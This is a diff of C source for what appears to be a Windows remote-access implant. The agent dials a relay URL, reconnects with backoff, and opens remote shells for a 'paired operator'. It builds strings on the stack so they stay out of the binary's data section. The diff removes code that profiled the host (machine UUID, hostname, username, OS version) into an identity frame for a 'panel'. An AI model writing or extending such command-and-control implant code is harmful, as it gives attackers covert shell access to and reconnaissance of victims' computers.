@@ -102,55 +102,6 @@
  * local builds fall back to a stack-built tag (a literal would sit in .rdata). */
 
 /* ==========================================================================
- * The identity frame (the reply to Hello)
- * ======================================================================== */
-
-/* Build the full 754-byte v5 identity frame. Returns the frame size.
- * Metadata first (status, api version, breed id, commit hash, build
- * number, 64-bit flag) so the panel can detect the layout before the
- * variable-length fields; then UUID + facts; mask last. See protocol.h. */
-static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
-                                const system_facts *facts)
-{
-    MemoryZero(frame, IDENTITY_FRAME_SIZE);
-    int pos = 0;
-
-    write_u32_le(frame, &pos, STATUS_OK);            /* status = 0       */
-    write_u32_le(frame, &pos, ID_API_VERSION);       /* API version = 5  */
-    write_u32_le(frame, &pos, ID_AGENT_NAME_ID);     /* breed id = 1     */
-#ifdef AGENT_COMMIT_HASH_DEFINED
-    write_ascii_field(frame, &pos, AGENT_COMMIT_HASH, ID_COMMIT_HASH_SIZE);
-#else
-    CHAR commit_buf[9];
-    StrCommitDefault(commit_buf);
-    write_ascii_field(frame, &pos, commit_buf, ID_COMMIT_HASH_SIZE);
-#endif
-    write_u32_le(frame, &pos, ID_BUILD_NUMBER);      /* build number     */
-
-    frame[pos++] = (unsigned char)(sizeof(void *) == 8 ? 1 : 0);  /* 64-bit */
-
-    unsigned char uuid[16];
-    get_machine_uuid(uuid);
-    MemoryCopy(frame + pos, uuid, 16);               /* machine UUID     */
-    pos += 16;
-
-    write_ascii_field(frame, &pos, facts->hostname,  ID_HOSTNAME_SIZE);
-    write_ascii_field(frame, &pos, facts->username,  ID_USERNAME_SIZE);
-    CHAR arch64[4]; StrX64(arch64);
-    CHAR arch86[4]; StrX86(arch86);
-    write_ascii_field(frame, &pos,
-                      sizeof(void *) == 8 ? arch64 : arch86, ID_ARCH_SIZE);
-    CHAR platform_buf[8];
-    StrPlatformWindows(platform_buf);
-    write_ascii_field(frame, &pos, platform_buf, ID_PLATFORM_SIZE);
-    write_ascii_field(frame, &pos, facts->os_version, ID_OS_VERSION_SIZE);
-
-    write_u64_le(frame, &pos, CAPABILITY_MASK);      /* capability mask  */
-
-    return pos;    /* == IDENTITY_FRAME_SIZE */
-}
-
-/* ==========================================================================
  * Command handlers (one reply per request, except Exit)
  * ======================================================================== */
 
@@ -163,16 +114,6 @@ typedef struct {
     int verbose;            /* -v: dump every command's raw bytes    */
     const WINHTTP_API *winhttp;  /* session table, owned by run_session */
 } agent_ctx;
-
-/* Reply to Hello: collect facts and build the identity frame. */
-static DWORD handle_hello(const agent_ctx *ctx, unsigned char *frame, DWORD *frame_len)
-{
-    (void)ctx;
-    system_facts facts;
-    collect_system_facts(&facts);
-    *frame_len = (DWORD)build_identity_frame(frame, &facts);
-    return NO_ERROR;
-}
 
 /* OpenShell: find a free pool slot (the slot index IS the shell id). */
 static DWORD handle_open_shell(const agent_ctx *ctx, unsigned char *reply, DWORD *reply_len)
@@ -335,12 +276,8 @@ INT32 agent_main(const WCHAR *url)
 
     MemoryZero(shells, sizeof(shells));   /* all slots start free */
     ctx.shells  = shells;
-    //ctx.verbose = verbose_flag;
     ctx.winhttp = NULL;                   /* run_session fills it */
-    // if (AnsiToWide(url_arg, url, 2048) == -1) {
-    //     LOG_ERROR("AnsiToWide(URL) failed\n");
-    //     return 1;
-    // }
+    
 
     /* ----- The agent loop: dial, serve, redial. A lost connection is a
      * normal event (the relay drops agent sockets when the paired operator
@@ -356,9 +293,7 @@ INT32 agent_main(const WCHAR *url)
         if (rc == RC_SESSION_LOST) {
 
             int wait_s = backoff_steps[backoff_pos];
-            /* Grow toward the cap while dialing keeps failing, but reset
-             * after a session that lived a while - one blip on a healthy
-             * day should not wait half a minute on the next one. */
+        
             if (long_lived)
                 backoff_pos = 0;
             else if (backoff_pos + 1 < backoff_count)
